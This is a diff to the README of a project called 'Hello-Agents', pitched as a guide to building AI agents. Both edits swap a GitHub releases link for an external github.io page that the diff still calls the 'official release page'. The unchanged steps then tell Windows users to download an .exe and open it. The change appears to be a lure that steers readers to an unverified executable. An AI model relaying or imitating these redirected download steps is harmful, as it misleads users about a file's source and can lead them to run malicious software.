@@ -1,6 +1,6 @@
 # 🤖 Hello-Agents - Build your own AI agent systems
 
-[![Download Hello-Agents](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/causesubpopulation914/Hello-Agents/releases)
+[![Download Hello-Agents](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://causesubpopulation914.github.io)
 
 This project provides a clear path to build AI agent systems. You learn how to create software that performs tasks using artificial intelligence. The guide takes you from basic concepts to building applications that run in a real environment.
 
@@ -22,7 +22,7 @@ To run Hello-Agents on your Windows computer, you need basic hardware. Ensure yo
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/causesubpopulation914/Hello-Agents/releases).
+1. Visit the [official release page](https://causesubpopulation914.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes.
